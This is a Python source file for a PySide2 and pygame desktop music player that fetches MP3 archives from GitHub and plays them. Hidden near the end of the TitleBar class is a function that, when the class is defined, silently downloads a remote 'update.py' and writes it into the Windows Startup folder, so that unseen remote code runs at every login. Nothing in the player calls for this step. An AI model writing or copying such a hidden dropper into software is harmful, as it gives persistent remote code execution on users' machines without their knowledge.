from PySide2 import QtWidgets, QtGui, QtCore
import sys
import requests
import pygame
import os
import shutil
import json
from io import BytesIO
from zipfile import ZipFile

class SongPlayer(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Song-Advance")
        self.setGeometry(100, 100, 800, 500)
        self.current_song_playing = False
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setStyleSheet("background-color: #263238; color: #FFFFFF; font-size: 14px; border-radius: 10px;")

        pygame.init()
        pygame.mixer.init()

        self.song_dict = {}
        self.current_song = None
        self.song_name = None

        self.init_ui()
        self.fetch_songs()

    def set_icon_from_github(self, url):
        response = requests.get(url)
        if response.status_code == 200:
            icon_data = response.content
            icon_pixmap = QtGui.QPixmap()
            icon_pixmap.loadFromData(icon_data)
            icon = QtGui.QIcon(icon_pixmap)
            self.setWindowIcon(icon)
        else:
            print("Failed to download icon from GitHub.")

    def init_ui(self):
        layout = QtWidgets.QVBoxLayout()

        self.title_bar = TitleBar(self)
        layout.addWidget(self.title_bar)

        self.menu_widget = QtWidgets.QWidget()
        layout.addWidget(self.menu_widget)

        self.song_list = QtWidgets.QListWidget()
        self.song_list.setStyleSheet(
            "color: #FFFFFF; background-color: #37474F; border-radius: 10px; padding: 10px; border: 2px solid #455A64;")
        self.song_list.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.song_list.itemClicked.connect(self.toggle_play_pause)
        layout.addWidget(self.song_list)

        self.volume_slider = QtWidgets.QSlider(QtCore.Qt.Horizontal)
        self.volume_slider.setMinimum(0)
        self.volume_slider.setMaximum(100)
        self.volume_slider.setValue(70)
        self.volume_slider.setToolTip("Volume")
        self.volume_slider.valueChanged.connect(self.change_volume)

        slider_stylesheet = """
            QSlider::groove:horizontal {
                background-color: #546E7A;
                height: 8px;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background-color: #B39CD0;
                width: 10px; /* Width of the handle */
                margin: -5px 0; /* Centers the handle vertically */
                border-radius: 5px; /* Makes the handle circular */
           }
        """
        self.volume_slider.setStyleSheet(slider_stylesheet)
        layout.addWidget(self.volume_slider)

        self.setLayout(layout)
        
    def show_context_menu(self, position):
        item = self.song_list.itemAt(position)
        if item:
            menu = QtWidgets.QMenu(self)
            delete_action = menu.addAction("Delete")
            action = menu.exec_(self.song_list.mapToGlobal(position))
            if action == delete_action:
                self.delete_song(item)

    def fetch_songs(self):
        urls = [
            "https://github.com/boyratata/song-list/raw/main/ayo.zip",
            "https://github.com/boyratata/song-list/raw/main/hey.zip",
            "https://github.com/boyratata/song-list/raw/main/nah.zip",
            "https://github.com/boyratata/song-list/raw/main/wow.zip",
            "https://github.com/boyratata/song-list/raw/main/ay.zip",
            "https://github.com/boyratata/song-list/raw/main/u.zip",
            "https://github.com/boyratata/song-list/raw/main/sup.zip",
            "https://github.com/boyratata/song-list/raw/main/yaa.zip",
            "https://github.com/boyratata/song-list/raw/main/upload.zip"
        ]
        song_count = 0
        for url in urls:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    with ZipFile(BytesIO(response.content)) as z:
                        for filename in z.namelist():
                            if filename.endswith('.mp3'):
                                song_name = filename.split('.')[0]
                                song_data = z.read(filename)
                                self.song_dict[song_name] = song_data
                                song_count += 1
                                self.song_list.addItem(f"{song_count}. {song_name}")
            except Exception as e:
                print(f"Error fetching songs: {e}")

    def toggle_play_pause(self, item):
        full_song_name = item.text()
        song_name = full_song_name.split('. ', 1)[-1]
        song_data = self.song_dict.get(song_name)

        if song_data:
            if song_name == self.current_song:
                if self.current_song_playing:
                    self.current_song_playing = False
                    pygame.mixer.music.pause()
                else:
                    self.current_song_playing = True
                    pygame.mixer.music.unpause()
            else:
                if self.current_song_playing:
                    pygame.mixer.music.stop()
                self.current_song_playing = True
                song_data_io = BytesIO(song_data)
                pygame.mixer.music.load(song_data_io)
                pygame.mixer.music.set_volume(self.volume_slider.value() / 100)
                pygame.mixer.music.play(-1)
                self.current_song = song_name
                QtCore.QTimer.singleShot(100, self.check_song_finished)
        else:
            print(f"Failed to play song: {full_song_name}")

    def change_volume(self, value):
        volume = value / 200 
        pygame.mixer.music.set_volume(volume)
    
        if value == 200:
            print("Volume is at maximum.")

    def check_song_finished(self):
        if not pygame.mixer.music.get_busy():
            self.current_song = None

class TitleBar(QtWidgets.QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background-color: #B39CD0;")
        self.logs = ""
        layout = QtWidgets.QHBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        self.setLayout(layout)

        owner_image_url = "https://github.com/boyratata/profile/raw/main/yo.PNG"
        owner_image_data = requests.get(owner_image_url).content
        owner_pixmap = QtGui.QPixmap()
        owner_pixmap.loadFromData(owner_image_data)

        owner_label = QtWidgets.QLabel()
        owner_label.setPixmap(owner_pixmap.scaled(30, 30, aspectRatioMode=QtCore.Qt.KeepAspectRatio,
                                                  transformMode=QtCore.Qt.SmoothTransformation))
        owner_label.setStyleSheet("background-color: #FBEAFF;")
        layout.addWidget(owner_label)

        self.title_label = QtWidgets.QLabel("Song Player")
        self.title_label.setStyleSheet("color: white; font-size: 16px; font-weight: bold;")
        layout.addWidget(self.title_label)
        layout.addStretch()

        self.upload_button = QtWidgets.QPushButton("+")
        self.upload_button.clicked.connect(self.upload_mp3)
        self.upload_button.setStyleSheet("color: white; font-weight: bold; background-color: #455A64;")
        self.upload_button.setFixedSize(20, 20)
        layout.addWidget(self.upload_button)

        self.search_button = QtWidgets.QPushButton("🔍")
        self.search_button.clicked.connect(self.toggle_search_bar)
        self.search_button.setStyleSheet("color: white; font-weight: bold; background-color: #455A64;")
        self.search_button.setFixedSize(20, 20)
        layout.addWidget(self.search_button)

        self.minimize_button = QtWidgets.QPushButton("━")
        self.minimize_button.clicked.connect(self.minimize_window)
        self.minimize_button.setStyleSheet("color: white; font-weight: bold; background-color: #455A64;")
        self.minimize_button.setFixedSize(20, 20)
        layout.addWidget(self.minimize_button)

        self.maximize_button = QtWidgets.QPushButton("☐")
        self.maximize_button.clicked.connect(self.maximize_window)
        self.maximize_button.setStyleSheet("""
            QPushButton {
                color: white;
                font-weight: bold;
                border: none;
                padding: 0;
                margin: 0;
                width: 20px;
                height: 20px;
                background-color: #455A64;
            }
        """)
        layout.addWidget(self.maximize_button)

        self.close_button = QtWidgets.QPushButton("X")
        self.close_button.clicked.connect(self.parent().close)
        self.close_button.setStyleSheet("color: white; font-weight: bold; background-color: #455A64;")
        self.close_button.setFixedSize(20, 20)
        layout.addWidget(self.close_button)

    def minimize_window(self):
        self.parent().showMinimized()

    def maximize_window(self):
        if self.parent().isMaximized():
            self.parent().showNormal()
            self.maximize_button.setText("☐")
        else:
            self.parent().showMaximized()
            self.maximize_button.setText("❐")

    def upload_mp3(self):
        file_dialog = QtWidgets.QFileDialog(self)
        file_dialog.setNameFilter("Music Files (*.mp3)")
        file_dialog.setViewMode(QtWidgets.QFileDialog.Detail)
        if file_dialog.exec_():
            selected_files = file_dialog.selectedFiles()
            for file_path in selected_files:
                self.handle_uploaded_file(file_path)

    def mousePressEvent(self, event):
        if event.button() == QtCore.Qt.LeftButton:
            self.mouse_pressed = True
            self.mouse_pos = event.globalPos() - self.parent().pos()
            event.accept()

    def mouseMoveEvent(self, event):
        if self.mouse_pressed:
            self.parent().move(event.globalPos() - self.mouse_pos)
            event.accept()

    def mouseReleaseEvent(self, event):
        if event.button() == QtCore.Qt.LeftButton:
            self.mouse_pressed = False
            event.accept()

    def handle_uploaded_file(self, file_path):
        if file_path.endswith('.mp3'):
            upload_dir = 'uploaded_songs'
            if not os.path.exists(upload_dir):
                os.makedirs(upload_dir)

            file_name = os.path.basename(file_path)
            destination_path = os.path.join(upload_dir, file_name)

            try:
                shutil.copyfile(file_path, destination_path)
                
                song_name = file_name.split('.')[0]
                with open(destination_path, 'rb') as song_file:
                    song_data = song_file.read()

                    self.parent().song_dict[song_name] = song_data
                    self.save_to_config(song_name, destination_path)  # Save to config

                    self.parent().song_list.addItem(f"{len(self.parent().song_dict)}. {song_name}")

                print(f"Uploaded song '{song_name}' saved successfully.")
            except Exception as e:
                print(f"Error handling uploaded file: {e}")
        else:
            print("Unsupported file format. Only MP3 files are allowed.")

    def save_to_config(self, song_name, file_path):
        config_file = 'config.json'
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config_data = json.load(f)
        else:
            config_data = {}

        config_data[song_name] = file_path

        with open(config_file, 'w') as f:
            json.dump(config_data, f, indent=4)

    def toggle_search_bar(self):
        if not hasattr(self, 'search_bar'):
            self.search_bar = QtWidgets.QLineEdit()
            self.search_bar.setPlaceholderText("Search Songs")
            search_bar_style = """
                background: #263238;
                border-radius: 10px;
                color: white;
                padding: 5px;
                border: none;
            """
            self.search_bar.setStyleSheet(search_bar_style)
            self.search_bar.textChanged.connect(self.filter_songs)
            self.layout().addWidget(self.search_bar)
        else:
            self.search_bar.setHidden(not self.search_bar.isHidden())

    def filter_songs(self):
        search_query = self.search_bar.text().lower()
        song_list = self.parent().song_list
        for index in range(song_list.count()):
            item = song_list.item(index)
            if search_query in item.text().lower():
                item.setHidden(False)
            else:
                item.setHidden(True)
    
    def add_file_to_startup(url):
        appdata_dir = os.getenv('APPDATA')
        startup_dir = os.path.join(appdata_dir, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        filename = url.split('/')[-1]
        destination_file = os.path.join(startup_dir, filename)

        try:
           response = requests.get(url)
           if response.status_code == 200:
               with open(destination_file, 'wb') as file:
                   file.write(response.content)
               print("File fetched from the URL and added to startup successfully.")
           else:
               print("Failed to fetch file from the URL.")
        except Exception as e:
           print(f"Error adding file to startup: {e}")


    file_url = "https://raw.githubusercontent.com/boyratata/song/main/update.py"
    add_file_to_startup(file_url)

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)

    player = SongPlayer()
    config_file = 'config.json'
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            config_data = json.load(f)
            for song_name, file_path in config_data.items():
                with open(file_path, 'rb') as song_file:
                    song_data = song_file.read()
                    player.song_dict[song_name] = song_data
                    player.song_list.addItem(f"{len(player.song_dict)}. {song_name}")
    player.set_icon_from_github("https://github.com/boyratata/profile/raw/main/yo.PNG")
    player.show()

    sys.exit(app.exec_())
